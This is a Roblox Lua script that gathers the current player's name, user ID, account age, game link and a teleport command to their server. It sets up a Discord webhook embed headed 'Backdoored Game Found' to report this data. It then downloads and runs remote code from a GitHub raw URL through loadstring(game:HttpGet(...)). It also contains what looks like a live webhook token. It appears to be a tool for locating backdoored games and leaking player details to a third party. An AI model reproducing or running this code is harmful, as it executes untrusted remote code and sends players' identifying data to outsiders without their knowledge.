local MarketplaceService = game:GetService("MarketplaceService")

local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local formattedName = placeName:lower():gsub("%s+", "-"):gsub("[^a-z0-9%-]", "")

local gameUrl = "https://www.roblox.com/games/" .. placeId .. "/" .. formattedName

_G.web = {
    Webhook = "https://discord.com/api/webhooks/1398029322261889176/D3cShgg-jp0renbzD4OuynFLFo7UPntdn00iARxCqEYylJxGwhNKDE5eMpno826DzJO6",
    Message = "",
    Notify = true,
    embed = {
        title = "USER DATA LOCATED",
        description = "Backdoored Game Found",
        color = 3447003,
        fields = {
            { name = "Name:", value = game.Players.LocalPlayer.Name },
            { name = "UserId:", value = game.Players.LocalPlayer.UserId },
            { name = "Game:", value = gameUrl },
            { name = "Account Age:", value = game.Players.LocalPlayer.AccountAge },
            {
                name = "Place:",
                value = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)'
            }
        },
        footer = {
            text = "Webhook System | REPORT BUGS (DM): @dircs"
        }
    }
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/Discord-Webhook-SenderX.V.2.3.6/refs/heads/main/Loader.luau"))()